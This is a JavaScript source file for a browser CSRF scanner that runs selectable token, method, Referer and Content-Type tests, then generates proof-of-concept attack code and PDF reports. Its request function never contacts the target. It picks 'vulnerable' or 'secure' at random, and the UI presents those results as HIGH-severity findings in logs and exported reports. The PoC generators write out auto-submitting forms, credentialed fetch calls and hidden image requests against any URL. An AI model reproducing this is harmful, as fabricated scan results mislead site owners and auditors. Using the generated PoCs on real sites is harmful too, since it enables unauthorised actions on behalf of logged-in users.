// CSRF Scanner Engine
// Automated CSRF vulnerability testing with PoC generation

class CSRFScanner {
    constructor() {
        this.isScanning = false;
        this.currentTestIndex = 0;
        this.results = [];
        this.vulnerabilities = [];
        this.startTime = null;
        this.targetUrl = '';
        this.httpMethod = 'POST';
        this.formParams = [];
        this.tokenParam = '';
        this.tokenValue = '';
        this.selectedTests = [];
        this.testsToRun = [];
        this.testedCount = 0;
        this.vulnCount = 0;
        this.secureCount = 0;
    }

    // Initialize scanner
    init() {
        this.setupEventListeners();
        this.updateTestCount();
    }

    // Setup event listeners
    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('add-param-btn')?.addEventListener('click', () => this.addParameter());
        document.getElementById('generate-poc-btn')?.addEventListener('click', () => this.showPoC());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportToPDF());
        document.getElementById('copy-poc-btn')?.addEventListener('click', () => this.copyPoC());

        // PoC tab switching
        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchPoCTab(e.target.dataset.tab));
        });

        // Remove parameter buttons
        this.setupParamRemoval();
    }

    // Setup parameter removal
    setupParamRemoval() {
        document.addEventListener('click', (e) => {
            if (e.target.classList.contains('remove-param')) {
                e.target.closest('.param-row').remove();
                this.updateParamRemovalButtons();
            }
        });
    }

    // Add parameter row
    addParameter() {
        const container = document.getElementById('params-container');
        const row = document.createElement('div');
        row.className = 'param-row';
        row.innerHTML = `
            <input type="text" class="input param-name" placeholder="Parameter name">
            <input type="text" class="input param-value" placeholder="Test value">
            <button class="btn btn-ghost btn-sm remove-param">✕</button>
        `;
        container.appendChild(row);
        this.updateParamRemovalButtons();
    }

    // Update parameter removal buttons visibility
    updateParamRemovalButtons() {
        const rows = document.querySelectorAll('.param-row');
        rows.forEach((row, index) => {
            const removeBtn = row.querySelector('.remove-param');
            removeBtn.style.display = rows.length > 1 ? 'flex' : 'none';
        });
    }

    // Update test count
    updateTestCount() {
        document.getElementById('total-tests').textContent = '20+';
    }

    // Start scanning
    async startScan() {
        // Get configuration
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;
        this.tokenParam = document.getElementById('token-param')?.value.trim();
        this.tokenValue = document.getElementById('token-value')?.value.trim();

        // Validate inputs
        if (!this.targetUrl) {
            this.showNotification('Please enter a target URL', 'error');
            return;
        }

        // Get form parameters
        this.formParams = [];
        document.querySelectorAll('.param-row').forEach(row => {
            const name = row.querySelector('.param-name').value.trim();
            const value = row.querySelector('.param-value').value.trim();
            if (name) {
                this.formParams.push({ name, value });
            }
        });

        if (this.formParams.length === 0) {
            this.showNotification('Please add at least one form parameter', 'error');
            return;
        }

        // Get selected tests
        this.selectedTests = [];
        if (document.getElementById('test-no-token')?.checked) this.selectedTests.push('noToken');
        if (document.getElementById('test-wrong-token')?.checked) this.selectedTests.push('wrongToken');
        if (document.getElementById('test-method-change')?.checked) this.selectedTests.push('methodChange');
        if (document.getElementById('test-referer')?.checked) this.selectedTests.push('refererBypass');
        if (document.getElementById('test-content-type')?.checked) this.selectedTests.push('contentType');
        if (document.getElementById('test-cookie-jar')?.checked) this.selectedTests.push('cookieJar');

        if (this.selectedTests.length === 0) {
            this.showNotification('Please select at least one test type', 'error');
            return;
        }

        // Prepare tests
        this.prepareTests();

        // Reset state
        this.isScanning = true;
        this.currentTestIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.secureCount = 0;
        this.results = [];
        this.vulnerabilities = [];
        this.startTime = Date.now();

        // Update UI
        this.showAttackVisualization();
        this.updateScanControls(true);
        this.log('CSRF scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Method: ${this.httpMethod}`, 'info');
        this.log(`Parameters: ${this.formParams.map(p => p.name).join(', ')}`, 'info');
        this.log(`Total tests: ${this.testsToRun.length}`, 'info');

        // Start test loop
        await this.testLoop();
    }

    // Prepare tests
    prepareTests() {
        this.testsToRun = [];

        for (const testType of this.selectedTests) {
            this.testsToRun.push({
                type: testType,
                name: this.getTestName(testType),
                description: this.getTestDescription(testType)
            });
        }
    }

    // Get test name
    getTestName(type) {
        const names = {
            'noToken': 'No CSRF Token',
            'wrongToken': 'Invalid Token',
            'methodChange': 'Method Override',
            'refererBypass': 'Referer Bypass',
            'contentType': 'Content-Type Change',
            'cookieJar': 'Cookie Jar Attack'
        };
        return names[type] || type;
    }

    // Get test description
    getTestDescription(type) {
        const descriptions = {
            'noToken': 'Request without CSRF token',
            'wrongToken': 'Request with invalid token value',
            'methodChange': 'Change POST to GET or vice versa',
            'refererBypass': 'Omit or modify Referer header',
            'contentType': 'Change Content-Type header',
            'cookieJar': 'Test SameSite cookie bypass'
        };
        return descriptions[type] || '';
    }

    // Main test loop
    async testLoop() {
        while (this.isScanning && this.currentTestIndex < this.testsToRun.length) {
            const test = this.testsToRun[this.currentTestIndex];
            await this.runTest(test);

            this.currentTestIndex++;
            this.updateProgress();

            await this.sleep(500);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    // Run a single test
    async runTest(test) {
        const { type, name, description } = test;

        // Update current test display
        this.updateCurrentTest(name, type);

        try {
            // Build request based on test type
            const request = this.buildTestRequest(type);

            // Make request (simulated)
            const response = await this.makeRequest(request);

            // Analyze response
            const isVulnerable = this.analyzeResponse(response, type);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: type,
                    name: name,
                    description: description,
                    request: request,
                    response: response,
                    severity: 'HIGH'
                });
                this.log(`✓ VULNERABLE: ${name}`, 'success');
            } else {
                this.secureCount++;
                this.log(`✗ Secure: ${name}`, 'info');
            }

            this.results.push({
                type: type,
                name: name,
                vulnerable: isVulnerable,
                response: response
            });

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${name}: ${error.message}`, 'error');
        }
    }

    // Build test request
    buildTestRequest(type) {
        const request = {
            url: this.targetUrl,
            method: this.httpMethod,
            params: [...this.formParams],
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        };

        // Add token if specified
        if (this.tokenParam && this.tokenValue) {
            request.params.push({
                name: this.tokenParam,
                value: this.tokenValue
            });
        }

        // Modify request based on test type
        switch (type) {
            case 'noToken':
                // Remove token parameter
                request.params = request.params.filter(p => p.name !== this.tokenParam);
                break;

            case 'wrongToken':
                // Replace token with invalid value
                const tokenIndex = request.params.findIndex(p => p.name === this.tokenParam);
                if (tokenIndex !== -1) {
                    request.params[tokenIndex].value = 'invalid_token_12345';
                }
                break;

            case 'methodChange':
                // Change method
                request.method = request.method === 'POST' ? 'GET' : 'POST';
                break;

            case 'refererBypass':
                // Remove referer
                request.headers['Referer'] = '';
                break;

            case 'contentType':
                // Change content type
                request.headers['Content-Type'] = 'text/plain';
                break;

            case 'cookieJar':
                // Test without cookies
                request.withCredentials = false;
                break;
        }

        return request;
    }

    // Make HTTP request (simulated)
    async makeRequest(request) {
        // Simulate request
        await this.sleep(200);

        // Simulate response based on test type
        const isVulnerable = Math.random() > 0.5;

        return {
            status: isVulnerable ? 200 : 403,
            statusText: isVulnerable ? 'OK' : 'Forbidden',
            success: isVulnerable
        };
    }

    // Analyze response
    analyzeResponse(response, type) {
        // Check if request was successful (indicating vulnerability)
        return response.success;
    }

    // Update current test display
    updateCurrentTest(name, type) {
        document.getElementById('current-type').textContent = name;

        const request = this.buildTestRequest(type);
        document.getElementById('test-method').textContent = request.method;

        const tokenParam = request.params.find(p => p.name === this.tokenParam);
        document.getElementById('test-token').textContent = tokenParam ? tokenParam.value.substring(0, 20) + '...' : 'None';
    }

    // Update progress
    updateProgress() {
        const progress = (this.currentTestIndex / this.testsToRun.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Running test ${this.currentTestIndex} of ${this.testsToRun.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('secure-count').textContent = this.secureCount;
        document.getElementById('vuln-count-badge').textContent = this.vulnCount;
    }

    // Complete scan
    completeScan() {
        this.isScanning = false;

        const duration = ((Date.now() - this.startTime) / 1000).toFixed(2);

        this.log(`Scan completed in ${duration} seconds`, 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`CSRF vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');
        this.log(`Secure endpoints: ${this.secureCount}`, 'info');

        document.getElementById('scan-status').textContent = 'Scan Complete';
        document.querySelector('.status-dot').classList.remove('scanning');
        document.querySelector('.status-dot').classList.add(this.vulnCount > 0 ? 'success' : 'error');

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} CSRF vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    // Stop scan
    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    // Show attack visualization
    showAttackVisualization() {
        document.getElementById('attack-visualization').style.display = 'block';
        document.getElementById('attack-visualization').scrollIntoView({ behavior: 'smooth' });
    }

    // Update scan controls
    updateScanControls(isScanning) {
        document.getElementById('start-scan-btn').style.display = isScanning ? 'none' : 'inline-flex';
        document.getElementById('stop-scan-btn').style.display = isScanning ? 'inline-flex' : 'none';
    }

    // Show results
    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">CSRF Vulnerability #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Target:</strong> ${this.targetUrl}
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Method:</strong> ${vuln.request.method}
                </div>
                <div style="color: var(--color-text-secondary);">
                    <strong>Impact:</strong> Attacker can perform unauthorized actions on behalf of authenticated users
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    // Show PoC
    showPoC() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate PoC', 'warning');
            return;
        }

        const pocSection = document.getElementById('poc-section');
        pocSection.style.display = 'block';
        pocSection.scrollIntoView({ behavior: 'smooth' });

        this.generatePoC('html');
    }

    // Switch PoC tab
    switchPoCTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generatePoC(tab);
    }

    // Generate PoC code
    generatePoC(type) {
        const vuln = this.vulnerabilities[0]; // Use first vulnerability
        const pocCode = document.getElementById('poc-code');

        let code = '';

        switch (type) {
            case 'html':
                code = this.generateHTMLPoC(vuln);
                break;
            case 'ajax':
                code = this.generateAJAXPoC(vuln);
                break;
            case 'img':
                code = this.generateIMGPoC(vuln);
                break;
        }

        pocCode.textContent = code;
    }

    // Generate HTML form PoC
    generateHTMLPoC(vuln) {
        const params = this.formParams.map(p =>
            `    <input type="hidden" name="${p.name}" value="${p.value}" />`
        ).join('\n');

        return `<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF Proof of Concept</h1>
    <form action="${this.targetUrl}" method="${vuln.request.method}">
${params}
        <input type="submit" value="Submit Request" />
    </form>
    
    <!-- Auto-submit (optional) -->
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>`;
    }

    // Generate AJAX PoC
    generateAJAXPoC(vuln) {
        const params = this.formParams.map(p => `${p.name}=${encodeURIComponent(p.value)}`).join('&');

        return `<script>
// CSRF PoC using AJAX
fetch('${this.targetUrl}', {
    method: '${vuln.request.method}',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: '${params}',
    credentials: 'include'
})
.then(response => response.text())
.then(data => console.log('CSRF attack successful:', data))
.catch(error => console.error('Error:', error));
</script>`;
    }

    // Generate IMG tag PoC (for GET requests)
    generateIMGPoC(vuln) {
        const params = this.formParams.map(p => `${p.name}=${encodeURIComponent(p.value)}`).join('&');
        const url = `${this.targetUrl}?${params}`;

        return `<!-- CSRF PoC using IMG tag (GET only) -->
<img src="${url}" style="display:none;" />

<!-- Or using JavaScript -->
<script>
    var img = new Image();
    img.src = '${url}';
</script>`;
    }

    // Copy PoC
    copyPoC() {
        const code = document.getElementById('poc-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('PoC copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy PoC', 'error');
        });
    }

    // Export to PDF
    async exportToPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('CSRF Scan Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Method: ${this.httpMethod}`, 20, 42);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 49);
            doc.text(`CSRF Vulnerabilities Found: ${this.vulnCount}`, 20, 56);

            let y = 70;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`CSRF Vulnerability #${index + 1}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Type: ${vuln.name}`, 20, y);
                y += 7;
                doc.text(`Description: ${vuln.description}`, 20, y);
                y += 7;
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 12;
            });

            doc.save('csrf-scan-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    // Log message
    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    // Clear log
    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    // Show notification
    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    // Utility: Sleep
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Initialize scanner when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    const scanner = new CSRFScanner();
    scanner.init();

    console.log('🛡️ CyberSec Suite CSRF Scanner initialized');
    console.log('📊 Ready to scan!');
});
